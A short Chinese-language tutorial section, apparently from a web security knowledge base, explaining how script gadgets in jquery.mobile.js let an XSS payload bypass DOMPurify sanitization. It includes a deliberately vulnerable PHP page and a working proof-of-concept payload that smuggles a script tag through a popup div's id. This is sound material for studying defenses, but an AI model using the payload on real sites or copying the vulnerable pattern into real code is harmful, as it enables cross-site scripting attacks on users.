Bypass Via Script Gadgets
================================

简介
--------------------------------
一些网站会使用白名单或者一些基于DOM的防御方式，对这些方式，有一种被称为 ``Code Reuse`` 的攻击方式可以绕过。该方式和二进制攻防中的Gadget相似，使用目标中的合法代码来达到绕过防御措施的目的。在论文 ``Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets`` 中有该方法的具体描述。

portswigger的一篇博文也表达了类似的想法 ``https://portswigger.net/blog/abusing-javascript-frameworks-to-bypass-xss-mitigations``。

下面有一个简单的例子，这个例子使用了 ``DOMPurify`` 来加固，但是因为引入了 ``jquery.mobile.js`` 导致可以被攻击。

例子
--------------------------------
::

    // index.php
    <?php

    $msg = $_GET['message'];
    $msg = str_replace("\n", "", $msg);
    $msg = base64_encode($msg);

    ?>

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Preview</title>
        <script type="text/javascript" src="purify.js"></script>
        <script type="text/javascript" src="jquery.js"></script>
        <script type="text/javascript" src="jquery.mobile.js"></script>
    </head>
    <body>
        
        <script type="text/javascript">
        var d= atob('<?php echo $msg; ?>');
        var cleanvar = DOMPurify.sanitize(d);
        document.write(cleanvar);
        </script>

    </body>
    </html>


::

    // payload
    <div data-role=popup id='-->
    &lt;script&gt;alert(1)&lt;/script&gt;'>
    </div>
